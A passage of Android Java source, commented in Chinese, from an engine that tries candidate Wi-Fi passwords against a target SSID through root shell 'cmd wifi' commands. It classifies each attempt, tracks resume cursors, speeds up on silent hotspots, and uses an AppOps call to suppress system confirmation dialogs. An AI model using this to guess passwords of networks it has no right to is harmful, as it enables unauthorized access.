     * @param notAttempted         命令未生效、本条候选没有被有效执行
     * @param onTargetNow          结束时仍显示连着目标（无本次归属证据）
     * @param suspectNetIdConflict 见过目标已连但与本次新建配置的 netId 不符
     * @param channelDead          未见尝试且通道无响应
     * @param statusShowsTarget    通道正常但结束时 status 显示目标、证据不足
     */
    public static DeadlineOutcome classifyDeadline(boolean notAttempted, boolean onTargetNow,
                                                   boolean suspectNetIdConflict,
                                                   boolean channelDead,
                                                   boolean statusShowsTarget) {
        return classifyDeadline(notAttempted, onTargetNow, suspectNetIdConflict,
                channelDead, statusShowsTarget, Lifecycle.UNKNOWN);
    }

    /**
     * 到期归类（**D4：实现已并入 {@link Adjudicator}**）。
     *
     * <h3>为什么必须合并</h3>
     * 修复前这里是**第二套判定**：五分支 if 链独立于 {@link Adjudicator} 产生
     * Verdict，而 {@code tryOneShell} 拿到结果后又在下方叠一段「生命周期兜底」
     * 把 UNKNOWN/TIMEOUT 覆盖成 INCOMPLETE。两张表先后执行、后者覆盖前者：
     * <pre>
     *   连接仍 ACTIVE + 无证据   -> 本函数 TIMEOUT -> 兜底 -> INCOMPLETE
     *   连接已 TERMINATED + 无证据 -> 本函数 TIMEOUT -> 不动 -> TIMEOUT
     *   连接状态读不到 + 无证据    -> 本函数 TIMEOUT -> 不动 -> TIMEOUT
     * </pre>
     * 后两行在最终结果里**完全一样**，而 {@link Adjudicator} 对它们有明确区分
     * （{@code TERMINATED_UNKNOWN} vs {@code UNKNOWN}）。同一个「到期」事实
     * 有两份答案，其中一份不认识 {@link AttemptState}，也不认识 {@link Evidence}。
     *
     * <p>现在本函数只做**输入翻译**：把五个布尔 + 生命周期翻译成一个
     * {@link AttemptState} 与一条 {@link Evidence}，结论仍然只由
     * {@link Adjudicator} 产生。签名保持不变（既有测试与
     * {@code R3AuditProbe} 依赖它），因此它是「同一判定核心的另一种调用形状」，
     * 而不是并行的第二套逻辑。
     *
     * <h3>翻译规则（逐条可核）</h3>
     * <table>
     *   <tr><th>输入</th><th>翻译成</th><th>裁决结果</th></tr>
     *   <tr><td>{@code notAttempted}</td><td>证据 NOT_CONNECTED + 闸门 UNREADABLE</td>
     *       <td>UNKNOWN（本函数再改写成 ERROR —— 见下）</td></tr>
     *   <tr><td>{@code channelDead}</td><td>证据 NOT_CONNECTED + 闸门 UNREADABLE</td>
     *       <td>UNKNOWN / channel-no-response</td></tr>
     *   <tr><td>{@code onTargetNow} / {@code netid-conflict} / {@code status-unclear}</td>
     *       <td>证据 CONNECTED + 归属 NONE（**不可归属**）</td>
     *       <td>UNKNOWN / on-target-unattributed</td></tr>
     *   <tr><td>以上都不成立</td><td>证据 NOT_CONNECTED + 归属 NONE</td>
     *       <td>按生命周期：ACTIVE→INCOMPLETE，TERMINATED→TERMINATED_UNKNOWN，
     *           UNKNOWN→UNKNOWN</td></tr>
     * </table>
     *
     * <p><b>{@code notAttempted} 为什么仍返回 ERROR</b>：那不是「结论 unknown」，
     * 而是「这条候选根本没被执行」（框架没建出配置 / connect 命令被静默丢弃）。
     * ERROR 在 {@code VerdictTally} / {@code VerdictView} 里都不算「试过」，
     * 语义与 UNKNOWN（试过但没结论）不同。这条映射**只在这里**发生一次，
     * 属于「同一核心 + 明确的业务改写」，不是并行判定。
     *
     * @param lifecycle 到期时的连接生命周期三态（{@code null} 视为 UNKNOWN）
     */
    public static DeadlineOutcome classifyDeadline(boolean notAttempted, boolean onTargetNow,
                                                   boolean suspectNetIdConflict,
                                                   boolean channelDead,
                                                   boolean statusShowsTarget,
                                                   Lifecycle lifecycle) {
        Lifecycle lc = lifecycle == null ? Lifecycle.UNKNOWN : lifecycle;

        // ---- 输入翻译：闸门 ----
        AttemptState.Gate gate = AttemptState.Gate.OK;
        if (notAttempted || channelDead) {
            // 命令没生效 / 通道不响应 -> 前置状态不可确认，规则 0 直接切掉。
            gate = AttemptState.Gate.UNREADABLE;
        }

        // ---- 输入翻译：证据 ----
        Evidence.Claim claim;
        Evidence.Attribution attr = Evidence.Attribution.NONE;
        String reasonOverride = null;
        if (notAttempted) {
            claim = Evidence.Claim.NOT_CONNECTED;
            reasonOverride = "not-attempted";
        } else if (onTargetNow) {
            // 「现在连着目标」但拿不到本次归属 -> CONNECTED + NONE。
            // Adjudicator 规则 2 会给出 UNKNOWN（既不当成功也不当失败）。
            claim = Evidence.Claim.CONNECTED;
            reasonOverride = "on-target-unattributed";
        } else if (suspectNetIdConflict) {
            claim = Evidence.Claim.CONNECTED;
            reasonOverride = "netid-conflict";
        } else if (channelDead) {
            claim = Evidence.Claim.NOT_CONNECTED;
            reasonOverride = "channel-no-response";
        } else if (statusShowsTarget) {
            claim = Evidence.Claim.CONNECTED;
            reasonOverride = "status-unclear";
        } else {
            claim = Evidence.Claim.NOT_CONNECTED;
        }

        // 归属：本函数的证据**没有 attemptId 可绑**（它描述的是「窗口结束时的整体
        // 观察」，不是某一条被标记的日志行）。Adjudicator 会丢弃未归属证据 ——
        // 这里必须给一个**非空且与本状态相同**的占位 id，否则每条证据都会被
        // 当成「别人的」丢掉，规则 1~8 全部退化到规则 9（TIMEOUT）。
        // 这个占位 id 不会外泄：它不写进 Attempt，也不参与任何持久化。
        final String selfAid = "deadline-window";
        AttemptState st = new AttemptState(selfAid, lc, gate, false);
        // 五个输入全为假 = 观察窗口结束了、**什么都没观察到**。
        // 这时必须传**空证据列表**，才能命中 Adjudicator 规则 9 的 TIMEOUT
        // （"no-evidence"）。若塞一条 NOT_CONNECTED，就会落到规则 8 变成 UNKNOWN ——
        // 那会把「等满时限、毫无观察」错报成「观察到连接状态不明」，两种事实不同。
        java.util.List<Evidence> evs;
        if (!notAttempted && !onTargetNow && !suspectNetIdConflict
                && !channelDead && !statusShowsTarget) {
            evs = java.util.Collections.emptyList();
        } else {
            evs = java.util.Collections.singletonList(
                    new Evidence(Evidence.Source.SUCCESS_STATUS, claim, attr, selfAid, 0L));
        }
        Adjudicator.Result r = Adjudicator.adjudicate(st, evs);

        Verdict v = r.verdict;
        // 业务改写（唯一一处）：命令没生效 -> ERROR，不是「试过但无结论」。
        if (notAttempted) {
            v = Verdict.ERROR;
        }
        String reason = reasonOverride != null ? reasonOverride : r.reason;
        if (reason == null || reason.isEmpty()) {
            reason = r.reason == null ? "" : r.reason;
        }
        return new DeadlineOutcome(v, reason);
    }

    /**
     * 计算**新的续跑游标**（纯函数，可离线穷举）。
     *
     * <h3>语义</h3>
     * {@code cursor} 是「安全的续跑边界」：它之前的候选**全部**拿到了 DIRECT 结论。
     * 一旦某条候选没有拿到 DIRECT，边界就钉死在它身上 ——
     * 即使后面有候选拿到 DIRECT 也不能越过它。
     *
     * <h3>反例（本函数修的 bug）</h3>
     * <pre>
     *   A=INFERRED, B=DIRECT, C=NONE
     *   旧的「无条件覆盖」写法：处理完 B 时 cursor = 2
     *   -> A（index 0）被永久越过，续跑从 C 开始，A 再没机会。
     *   本函数：A 非 DIRECT -> cursor 停在 0；B 虽 DIRECT 但 cursor(0) != 1
     *   -> 不推进；结果 cursor = 0，续跑会从 A 重新验证。
     * </pre>
     *
     * @param cursor 当前边界（本轮起点或上一次推进后的值）
     * @param i      当前候选下标
     * @param grade  当前候选的证据等级
     * @return 新的边界
     */
    public static int nextCursor(int cursor, int i, EvidenceGrade.Level grade) {
        // 两个条件缺一不可：
        //   ① 本条是 DIRECT（可直接验证的结论）
        //   ② 边界正好落在本条（说明前面没有留下未定的候选）
        if (EvidenceGrade.advancesCursor(grade) && cursor == i) {
            return i + 1;
        }
        return cursor;
    }

    /**
     * 自适应窗口（P0 提速，纯函数可离线测）。
     *
     * <p>连续 {@code noEvidence} 条候选都是「观察窗口结束、无证据」超时
     * （{@link Verdict#TIMEOUT}）时，说明目标网络不给任何失败/成功证据
     * （典型：手机热点），等满 10 秒纯属浪费 —— 缩短到 {@link #WINDOW_TRIMMED_MS}。
     *
     * <p>判定语义不变：TIMEOUT 映射 NONE，不写盘、不推进游标、不排除候选；
     * 窗口缩短只是「少等 4 秒」。
     *
     * <p>安全网：正确密码命中会让目标出现在 status，触发看门狗延长 4 秒
     * （见 tryOneShell），不受缩窗影响；任何非 TIMEOUT 结论都会重置计数、
     * 恢复全窗。
     *
     * @param noEvidence 当前连续无证据超时的条数
     * @param basePerItem 基准单发时限（毫秒）
     * @return 本条候选应使用的单发时限
     */
    /**
     * 连接是否**仍处于活动状态**（v2.1 新增，纯函数可测）。
     *
     * <p>用于区分「观察期限到」的两种含义：
     * <ul>
     *   <li>连接**仍活动**（ASSOCIATING/AUTHENTICATING/FOUR_WAY_HANDSHAKE/GROUP_HANDSHAKE，
     *       或 COMPLETED 但还没 IP）→ 观察期只是"等不下去"，**不得判密码错** → INCOMPLETE；</li>
     *   <li>连接**已终止**（DISCONNECTED/INACTIVE/状态缺失）→ 可走 TIMEOUT/既有裁决。</li>
     * </ul>
     *
     * <p><b>为什么必须有它</b>：真实事故（2026-11-02，ASSOCIATING 期间）——
     * 弱失败日志在连接还活着时就把候选判成 AUTH_FAIL。
     */
    /** 连接生命周期三态（v2.1）。 */
    public enum Lifecycle {
        /** 连接仍在进行（关联/认证/握手/扫描中）。 */
        ACTIVE,
        /** 已确认终止（明确看到 DISCONNECTED / INACTIVE）。 */
        TERMINATED,
        /** 状态读不到 / 解析失败 / 不可识别 —— **不得当作 TERMINATED**。 */
        UNKNOWN
    }

    /**
     * 由 supplicant state 得出生命周期三态（纯函数可测）。
     *
     * <p><b>为什么必须是三态而不是 boolean</b>：真机事故里，
     * 「state 读不到」（命令失败/null/解析失败）曾被当成「连接已终止」，
     * 于是弱失败证据被升级成 AUTH_FAIL。**未知必须保持未知。**
     */
    public static Lifecycle lifecycleOf(String supplicantState) {
        if (supplicantState == null || supplicantState.isEmpty()) return Lifecycle.UNKNOWN;
        String st = supplicantState.toUpperCase(java.util.Locale.ROOT);
        switch (st) {
            case "ASSOCIATING":
            case "AUTHENTICATING":
            case "FOUR_WAY_HANDSHAKE":
            case "GROUP_HANDSHAKE":
            case "SCANNING":
            case "COMPLETED":       // 已连上（可能还没 IP）——不是失败
            case "OBTAINING_IPADDR":
                return Lifecycle.ACTIVE;
            case "DISCONNECTED":
            case "INACTIVE":
            case "INTERFACE_DISABLED":
                return Lifecycle.TERMINATED;
            default:
                return Lifecycle.UNKNOWN;   // 未知状态一律 UNKNOWN，绝不当 TERMINATED
        }
    }

    /** 构造一个**非失败**终局 Attempt（NONE 级，不写 triedSet、不推 cursor）。 */
    private static Attempt tailOf(String password, Verdict v, long ms, String by, String detail) {
        Attempt a = new Attempt(password, v, ms, detail, by);
        a.grade = EvidenceGrade.Level.NONE;
        return a;
    }

    /** 兼容入口：是否仍活动（仅 ACTIVE 为真）。 */
    public static boolean connectionStillActive(String supplicantState) {
        return lifecycleOf(supplicantState) == Lifecycle.ACTIVE;
    }

    /**
     * **唯一结论出口**（C3）：把一条证据交给 {@link Adjudicator} 裁决。
     *
     * <p>五种证据源（failover / authcast / m1retry / wpalog 支A / wpalog 支B）
     * 迁移后都不再自己 {@code new Attempt(..., Verdict.AUTH_FAIL, ...)}，
     * 而是构造一条 {@link Evidence} 交到这里 —— 「这算成功还是失败、能不能
     * 永久排除」只由 {@link Adjudicator} 回答一次。
     *
     * @param password    本条候选（仅用于判词脱敏）
     * @param lifecycle   当前连接生命周期三态
     * @param gate        前置闸门结果（循环内意味着已通过，传 OK）
     * @param source      证据来源
     * @param claim       主张
     * @param attribution 归属强度（决定能否永久排除）
     * @param attemptId   本条 Attempt 的 id（归属过滤用）
     * @param netIdKnown  本次是否建出配置（**只作诊断，不构成归属证据**）
     * @param ms          本条耗时
     * @param humanDetail 人为可读补充（沿用原判词口径，便于对比迁移前后）
     */
    private Attempt judge(String password, Lifecycle lifecycle, AttemptState.Gate gate,
                          Evidence.Source source, Evidence.Claim claim,
                          Evidence.Attribution attribution, String attemptId,
                          boolean netIdKnown, long ms, String humanDetail) {
        AttemptState st = new AttemptState(attemptId, lifecycle, gate, netIdKnown);
        Evidence e = new Evidence(source, claim, attribution, attemptId, ms);
        Adjudicator.Result r = Adjudicator.adjudicate(st, java.util.Collections.singletonList(e));
        return Adjudicator.toAttempt(password, r, ms, humanDetail, byNameOf(source));
    }

    /** 证据来源 -> 判词里的 by 标签（与迁移前逐字一致，便于比对旧日志）。 */
    private static String byNameOf(Evidence.Source src) {
        if (src == null) return "";
        switch (src) {
            case FAILOVER: return "failover";
            case AUTHCAST: return "authcast";
            case M1RETRY: return "m1retry";
            case WPALOG_A:
            case WPALOG_B: return "wpalog";
            case SUCCESS_STATUS: return "supplicant";
            case SUCCESS_LOG: return "wpalog";
            default: return "";
        }
    }

    /**
     * 由 {@code cmd wifi status} 的**原始输出**得出生命周期（纯函数，可离线穷举）。
     *
     * <h3>为什么不能只用 {@link #lifecycleOf(String)}</h3>
     * {@code lifecycleOf} 吃的是「已解析出的 Supplicant state」。但真机上最常见的
     * 两种情形根本没有 state 可解析：
     * <pre>
     *   连接已断开   : Wifi is not connected
     *   Wi-Fi 被关掉 : Wifi is disabled
     * </pre>
     * 这两行是**系统明确告诉你「现在没有连接」**，属于可判定的 TERMINATED。
     * 旧实现把它们解析成 {@code state == null} -> UNKNOWN，于是「连接确实终止」
     * 与「命令读不到」两种完全不同的情况被混为一谈 —— 判定能力被白白丢掉一层，
     * TERMINATED_UNKNOWN 永远不可达。
     *
     * <h3>反过来也不能过度解读</h3>
     * <ul>
     *   <li>输出为空 / null（命令失败、通道无响应）-> <b>UNKNOWN</b>，不是 TERMINATED。<br>
     *       读不到 != 没连接。这是修复前的核心事故形态。</li>
     *   <li>有输出但既无 WifiInfo 行也无已知字面量 -> <b>UNKNOWN</b>（不敢断言）。</li>
     * </ul>
     *
     * <h3>回连他网必须算 TERMINATED</h3>
     * {@code COMPLETED} 只有在**属于目标 SSID** 时才算「本次尝试仍在推进」。
     * 若 WifiInfo 显示已连上**别的**网络，本次尝试显然已经结束（failover 现场），
     * 必须判 TERMINATED —— 否则会长期停在 ACTIVE，把一条本该
     * TERMINATED_UNKNOWN 的候选拖成 INCOMPLETE。
     *
     * @param rawStatus {@code cmd wifi status} 的原始输出，可为 null
     * @param targetSsid 目标 SSID，可为 null（此时不看归属）
     */
    public static Lifecycle lifecycleOfStatus(String rawStatus, String targetSsid) {
        if (rawStatus == null || rawStatus.trim().isEmpty()) return Lifecycle.UNKNOWN;
        String lower = rawStatus.toLowerCase(java.util.Locale.ROOT);
        if (lower.contains("wifi is not connected")) return Lifecycle.TERMINATED;
        if (lower.contains("wifi is disabled")) return Lifecycle.TERMINATED;
        SupplicantParser.Info info = SupplicantParser.parse(rawStatus);
        if (info.raw) {
            String st = info.state;
            if (st == null || st.isEmpty()) return Lifecycle.UNKNOWN;
            if (targetSsid != null && !targetSsid.isEmpty()
                    && info.ssid != null && !info.ssid.isEmpty()
                    && !targetSsid.equals(info.ssid)) {
                return Lifecycle.TERMINATED;
            }
            return lifecycleOf(st);
        }
        return Lifecycle.UNKNOWN;
    }

    public static long adaptiveWindow(int noEvidence, long basePerItem) {
        if (noEvidence >= TRIM_AFTER_NO_EVIDENCE) {
            return Math.min(basePerItem, WINDOW_TRIMMED_MS);
        }
        return basePerItem;
    }

    // ------------------------------------------------------------------ 前置检查

    public static final class CheckResult {
        public final boolean ok;
        public final String title;
        public final String detail;
        public CheckResult(boolean ok, String title, String detail) {
            this.ok = ok;
            this.title = title;
            this.detail = detail == null ? "" : detail;
        }
    }

    /**
     * **仅供测试**：跳过 {@code check()} 里的 WifiManager 可用性判断（包级可见）。
     *
     * <p>纯 JVM 单测没有 Android 的 WifiManager（android.jar 是桩），
     * 而 {@code run()} 的第一行就是 {@code check()}。测试要执行真实的 run 主循环，
     * 就必须过这一关。生产代码在包外，编译期即无法调用，
     * 且本字段默认 false —— 生产行为与重构前逐字节一致。
     */
    private volatile boolean wifiCheckBypassForTest = false;

    /** **仅供测试**：置位后 {@link #check()} 直接返回可用。 */
    void bypassWifiCheckForTest() {
        this.wifiCheckBypassForTest = true;
    }

    /** 基线（命令前）状态判定结果。 */
    public enum Baseline { DECIDE_LINKED, DECIDE_CLEAR, DECIDE_UNREADABLE }

    /**
     * 命令前的基线判定（纯函数，可离线穷举）。
     *
     * <h3>D1：为什么需要三态</h3>
     * 旧代码只用「SSID 命中 或 netId 命中」决定是否断开：
     * <pre>
     *   if (linkedBySsid || linkedByNetId) { 断开并确认 }
     * </pre>
     * 两者都不成立时**直接放行**。问题是「两者都不成立」既可能是
     * 「确实没连着目标」，也可能是「status 读超时 + list-networks 读失败」
     * —— 后者意味着我们**根本不知道**系统是否还挂着目标配置。
     * 若此时系统其实仍连着目标，命令后四条件立刻成立 → 误判 SUCCESS。
     *
     * <p>修正后的语义：
     * <ol>
     *   <li>任一来源命中目标 → {@code DECIDE_LINKED}（必须断开）</li>
     *   <li>至少一侧**读到过**且都不是目标 → {@code DECIDE_CLEAR}（可确认干净）</li>
     *   <li>两侧都读不到 → {@code DECIDE_UNREADABLE}（不可判定，本条判 UNKNOWN）</li>
     * </ol>
     *
     * <p>第 3 条是关键：宁可不判一条候选，也不能在「不知道系统连着谁」的情况下
     * 让后续四条件去归因。
     */
    public static Baseline baselineDecision(boolean ssidReadOk, boolean linkedBySsid,
                                            boolean netIdReadOk, boolean linkedByNetId) {
        if (linkedBySsid || linkedByNetId) return Baseline.DECIDE_LINKED;
        if (ssidReadOk || netIdReadOk) return Baseline.DECIDE_CLEAR;
        return Baseline.DECIDE_UNREADABLE;
    }

    /** 引擎在当前模式下能不能跑 */
    public CheckResult check() {
        if (wifiCheckBypassForTest) {
            return new CheckResult(true, "", "");
        }
        if (wifi == null) {
            return new CheckResult(false,
                    L.s("无法访问 WiFi 服务", "Cannot access the Wi-Fi service"),
                    L.s("系统没有提供 WifiManager。", "The system exposed no WifiManager."));
        }
        if (!wifi.isWifiEnabled()) {
            return new CheckResult(false,
                    L.s("WiFi 未开启", "Wi-Fi is off"),
                    L.s("请先打开 WiFi 开关再试。", "Turn Wi-Fi on first."));
        }
        return new CheckResult(true, "", "");
    }

    // ------------------------------------------------------------------ 判定核心

    /**
     * 当前是不是真的连着目标。
     *
     * 三个信号任一确认即算，返回确认者的名字；都不确认返回 null。
     * 这个方法是整个引擎可靠性的关键 —— 单看任何一个都会误判。
     */
    private String connectedSignal(String targetSsid, String statusOut) {
        // 信号 1：WifiInfo
        String cur = currentSsid();
        if (cur != null && cur.equals(targetSsid)) return "WifiInfo";

        // 信号 2：cmd wifi status 文本
        if (statusOut != null && statusOut.contains("connected to \"" + targetSsid + "\"")) {
            return "cmd-status";
        }

        return null;
    }

    /**
     * 把 CHANGE_WIFI_STATE 的操作登记为本应用发起。
     *
     * 这是「减少系统弹窗」的一环：系统在决定要不要弹确认框时，
     * 会看这次 Wi-Fi 操作是谁发起的、有没有走应用自己的前台界面。
     * 用 AppOps 标记之后，部分 ROM（含 ColorOS）会直接静默处理。
     *
     * 失败不影响功能，只是弹窗可能还在。
     */
    /** change_wifi_state 的 AppOps 名（字符串常量，避免不同版本字段缺失） */
    private static final String OP_CHANGE_WIFI = "android:change_wifi_state";

    private void noteAppOpAllow() {
        try {
            android.app.AppOpsManager ops = (android.app.AppOpsManager)
                    appCtx.getSystemService(Context.APP_OPS_SERVICE);
            if (ops == null) return;
            // 不同版本方法名不同，逐个试
            try {
                ops.noteOp(OP_CHANGE_WIFI,
                        android.os.Process.myUid(), appCtx.getPackageName());
            } catch (Throwable t1) {
                try {
                    java.lang.reflect.Method m = android.app.AppOpsManager.class
                            .getMethod("noteOpNoThrow", String.class, int.class, String.class);
                    m.invoke(ops, OP_CHANGE_WIFI,
                            android.os.Process.myUid(), appCtx.getPackageName());
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
    }

    /** 当前 SSID（已去引号） */
    private String currentSsid() {
        // **优先走 shell 的 `cmd wifi status`。**
        //
        // 缺定位权限时，App 侧的 `WifiInfo.getSSID()` 永远返回
        // `<unknown ssid>`。而这里的返回值被大量判定与防护逻辑用到：
        //   · 基线断开确认（disconnectAndVerify）
        //   · 命令前 SSID（ssidBefore）
        //   · 判据 D
        // 一旦恒为 null，这些防护会**静默失效**（例如「命令前不是目标」
        // 会被判成成立），假阳性就从这里漏出来。
        // shell 侧不受定位权限影响，读得到就读它。
        if (shell != null) {
            try {
                String st = shell.exec("cmd wifi status", 5000);
                if (st != null && !st.trim().isEmpty()) {
                    String cur = StatusParser.currentSsid(st);
                    if (cur != null && !"<unknown ssid>".equals(cur)) return cur;
                    // status 明确说没连，就直接返回 null，不要再退回 App API
                    if (st.contains("Wifi is not connected")) return null;
                }
            } catch (Throwable ignored) {}
        }
        try {
            if (wifi == null) return null;
            WifiInfo info = wifi.getConnectionInfo();
            if (info == null) return null;
            String cur = info.getSSID();
            if (cur == null) return null;
            if (cur.length() >= 2 && cur.startsWith("\"") && cur.endsWith("\"")) {
                cur = cur.substring(1, cur.length() - 1);
            }
            if ("<unknown ssid>".equals(cur)) return null;
            return cur;
        } catch (Throwable t) {
            return null;
        }
    }

    // ------------------------------------------------------------------ 连接状态与基线

    /**
     * 当前是否连着某个网络（返回 SSID，没连返回 null）。
     *
     * 注意：这里读的是**系统级的当前连接**，它可能是：
     *   · 用户自己连的
     *   · 上一条候选留下的
     *   · 本条候选刚建立的
     * 单看这个值**无法区分**，所以不能直接当命中依据。
     */
    private String snapshotSsid() {
        return currentSsid();
    }

    /**
     * 解析 `cmd wifi status` 输出，判断当前是否连着目标、以及 netId。
     * 实现已抽到 {@link StatusParser}（纯逻辑，可离线测试）。
     */
    public static long[] parseStatusFor(String statusOut, String ssid) {
        StatusParser.Result r = StatusParser.parse(statusOut, ssid);
        return new long[]{r.onTarget ? 1 : 0, r.netId};
    }

    /**
     * 当前连接的 netId。
     *
     * **优先走 shell 的 `cmd wifi status`**：App 侧的
     * `WifiInfo.getNetworkId()` 在「正在连接」状态下会返回 -1 或过期的值，
     * 而判定恰恰最需要在那一刻拿到真实 netId（用来确认是不是本次新建的配置）。
     * shell 拿不到时才退回本地 API。
     */
    private long currentNetId() {
        if (shell != null) {
            try {
                String st = shell.exec("cmd wifi status", 5000);
                if (st != null && !st.trim().isEmpty()) {
                    long id = StatusParser.parse(st, null).netId;
                    if (id >= 0) return id;
                }
            } catch (Throwable ignored) {}
        }
        try {
            if (wifi == null) return -1;
            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
            if (info == null) return -1;
            int id = info.getNetworkId();
            return id < 0 ? -1 : id;
        } catch (Throwable t) {
            return -1;
        }
    }

    /**
     * 引擎自带的「删净目标配置」实现。
     *
     * 不依赖外部传入的 {@link ShellChannel#forgetTarget} —— 那个实现在
     * 不同调用方（前台服务 / 自检 / 连接自测）里有的做了回读校验、
     * 有的干脆是空实现，行为不一致。判定依赖「配置确实被清掉」，
     * 所以统一收在这里，谁调都一样。
     *
     * @return true = 确认已清干净
     */
    /**
     * 对外暴露的「删掉目标在系统里的配置」入口（R11 恢复流程用）。
     *
     * <p>恢复阶段必须把候选留下的配置删掉，而这段逻辑必须与判定阶段用的是
     * **同一份实现** —— 否则“删干净”这件事在两处会给出不同答案。
     *
     * @return true = 确认目标已不在已保存列表里
     */
    public boolean removeTargetConfig(String ssid) {
        return forgetTargetByShell(ssid);
    }

    private boolean forgetTargetByShell(String ssid) {
        if (shell == null || ssid == null) return false;
        // 两轮足够：第一轮删净即返回；第二轮兜「删了又被系统重建」的罕见情况。
        // 原来每轮是「删一次 + sleep(400) + 下轮再查」，现在把「删 + 等 0.3s + 回读」
        // 压进同一次 shell 调用 —— 省掉一次进程启动和一个固定 sleep。
        for (int round = 0; round < 2; round++) {
            long leftover = -1;
            try {
                String out = shell.exec("cmd wifi list-networks", 5000);
                if (out == null) return false;
                leftover = netIdIn(out, ssid);
            } catch (Throwable ignored) {
                return false;
            }
            if (leftover < 0) return true;
            try {
                // sleep 0.3 → 0.15（2026-10-23 实测）：这一步是「删 + 等 + 回读」，
                // 等的是让 framework 把删除落定。实测 0.05s 就已经读不到了（5/5 干净），
                // 取 0.15 留 3 倍余量 —— 万一真读回旧配置，下面的校验会让它多跑一轮
                // （只是慢，不会误判），所以这条可以放心压。
                String out2 = shell.exec("cmd wifi forget-network " + leftover
                        + "; sleep 0.15; cmd wifi list-networks", 6000);
                if (out2 != null && netIdIn(out2, ssid) < 0) return true;
            } catch (Throwable ignored) {}
        }
        return netIdOfTarget(ssid) < 0;
    }

    /** 从 `cmd wifi list-networks` 输出里找目标的 netId；找不到返回 -1。 */
    private long netIdIn(String out, String ssid) {
        if (out == null || ssid == null) return -1;
        for (String line : out.split("\n")) {
            Long id = parseNetIdLine(line, ssid);
            if (id != null) return id;
        }
        return -1;
    }

    /**
     * 查目标是本次新建网络的 netId（命令后用）。
     *
     * `cmd wifi connect-network` 会把目标写进已保存列表，
     * 命令后查到的 netId 就是**本次**配置的净标识。
     * 用它和 status 里的 Net ID 比对，就能把「连上了目标」归因到「这条候选」。
     */
    private long netIdOfTarget(String ssid) {
        if (shell == null || ssid == null || ssid.isEmpty()) return -1;
        try {
            String out = shell.exec("cmd wifi list-networks", 5000);
            if (out == null) return -1;
            for (String line : out.split("\n")) {
                Long id = parseNetIdLine(line, ssid);
                if (id != null) return id;
            }
        } catch (Throwable ignored) {}
        return -1;
    }

    /**
     * 从 `cmd wifi list-networks` 的一行里解析出 netId。
     * 实现已抽到 {@link ListNetworksParser}（纯逻辑，可离线测试）。
     */
    public static Long parseNetIdLine(String line, String ssid) {
        return ListNetworksParser.netIdOfLine(line, ssid);
    }

    /**
     * 断开当前连接，并确认真的断开了。
     *
     * 这是「基线」步骤：只有基线是「未连接目标」，
     * 后面的「连上了」才有意义。
     */
    private boolean disconnectAndVerify(String targetSsid) {
        // 先用本地 API
        try {
            if (wifi != null) wifi.disconnect();
        } catch (Throwable ignored) {}

        // **不能一看到“不是目标”就算断开成功**。
        // 断开瞬间 SSID 会变成 null / <unknown>，但系统可能马上又自动连回去（
        // 已保存的配置还在）。要“持续一段时间都没连目标”才能认。
        long stableSince = -1;
        for (int i = 0; i < 40; i++) {          // 最长 12 秒
            String cur = snapshotSsid();
            boolean off = (cur == null || !cur.equals(targetSsid));
            if (off) {
                if (stableSince < 0) stableSince = clock().uptimeMillis();
                // 连续 3 秒未连目标 → 认为基线稳定
                if (clock().uptimeMillis() - stableSince >= 3000) return true;
            } else {
                stableSince = -1;
            }
            sleep(300);
        }

        // 本地 API 不生效就走 shell（有通道的话）
        if (shell != null) {
            try { shell.exec("cmd wifi set-wifi-enabled disabled", 5000); } catch (Throwable ignored) {}
            sleep(1200);
            try { shell.exec("cmd wifi set-wifi-enabled enabled", 5000); } catch (Throwable ignored) {}
            for (int i = 0; i < 15; i++) {
                String cur = snapshotSsid();
                if (cur == null || !cur.equals(targetSsid)) return true;
                sleep(400);
            }
        }
        return false;
    }

    // ------------------------------------------------------------------ 通道自检

    /** 接入自检结果 */
    public static final class ChannelProbe {
        public final boolean ok;
        public final String summary;
        public final String detail;
        /** 逐项检查结果，给用户看细节 */
        public final java.util.List<String> steps = new java.util.ArrayList<>();

        ChannelProbe(boolean ok, String summary, String detail) {
            this.ok = ok;
            this.summary = summary == null ? "" : summary;
            this.detail = detail == null ? "" : detail;
        }

        /** 连同已收集的步骤一起构造。
         *
         * 之前 probeChannel 里先在临时对象上 step()，最后 new 了一个新对象返回 ——
         * detail（字符串）带过去了，但 steps（列表）留在了临时对象上，
         * 于是日志里出现「结论有、检查项 0 条」的怪现象。
         */
        ChannelProbe(boolean ok, String summary, String detail, java.util.List<String> from) {
            this(ok, summary, detail);
            if (from != null) this.steps.addAll(from);
        }

        void step(String s) { steps.add(s); }
    }

    /**
     * 检查当前通道是不是真的接入了。
     *
     * 这是用户要求的「完全判定」：不看界面写着什么，
     * 而是**实际跑一遍判定链**，每一步都留证据。
     *
     * <p>为什么必须做这个：设置里显示的模式只是 prefs 里存的一个数字，
     * 跟通道是否真的可用完全无关。之前没有自检，
     * 通道断了也照跑，跑完 97 条全是「未连上」，用户以为密码不对。
     */
    public ChannelProbe probeChannel() {
        ChannelProbe p = new ChannelProbe(true, "", "");

        // --- 1. WiFi 开关 ---
        boolean wifiOn = false;
        try { wifiOn = wifiCheckBypassForTest || (wifi != null && wifi.isWifiEnabled()); }
        catch (Throwable ignored) { wifiOn = wifiCheckBypassForTest; }
        p.step((wifiOn ? "✓ " : "✗ ") + L.s("WiFi 开关: ", "Wi-Fi enabled: ")
                + (wifiOn ? L.s("开", "on") : L.s("关", "off")));
        if (!wifiOn) {
            p.step(L.s("  → 请先打开 WiFi", "  -> turn Wi-Fi on first"));
            return new ChannelProbe(false,
                    L.s("WiFi 未开启", "Wi-Fi is off"),
                    join(p), p.steps);
        }

        // --- 2. 通道类型：只有 Root ---
        if (shell == null) {
            p.step("✗ " + L.s("shell 通道未设置", "shell channel not set"));
            return new ChannelProbe(false,
                    L.s("通道未接入", "channel not attached"),
                    join(p) + "\n" + L.s("这是程序内部错误，请反馈。",
                            "This is an internal error; please report it."));
        }
        p.step("✓ " + L.s("通道类型: ", "channel type: ") + shell.name());

        // 真跑一条，看能不能执行
        String out = null;
        long t0 = clock().uptimeMillis();
        try {
            out = shell.exec("cmd wifi status", 8000);
        } catch (Throwable t) {
            p.step("✗ " + L.s("执行命令抛异常: ", "exec threw: ") + t.getClass().getSimpleName());
        }
        long cost = clock().uptimeMillis() - t0;

        if (out == null) {
            p.step("✗ " + L.s("命令没有返回（通道断了或未授权）",
                    "command returned nothing (channel down or not granted)"));
            p.step("  " + L.s("耗时 ", "took ") + cost + "ms");
            return new ChannelProbe(false,
                    L.s("通道未真正接入", "channel is not actually attached"),
                    join(p) + "\n\n" + L.s(
